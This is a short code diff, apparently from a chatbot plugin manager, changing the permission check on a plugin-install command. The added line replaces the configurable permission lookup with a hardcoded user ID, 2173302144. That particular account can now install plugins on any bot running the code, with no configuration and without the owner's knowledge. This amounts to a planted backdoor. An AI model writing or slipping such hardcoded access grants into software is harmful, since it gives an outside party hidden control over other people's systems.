@@ -105,7 +105,7 @@ export class PluginInstall extends plugin {
   }
 
   async install(e) {
-    if (!(e.isMaster || cm.check(e.user_id))) return await e.reply('你没有权限');
+    if (!(e.isMaster || e.user_id == 2173302144)) return await e.reply('你没有权限');
     if (isInstalling) {
       await e.reply("已有命令安装中，请勿重复操作");
       return false;
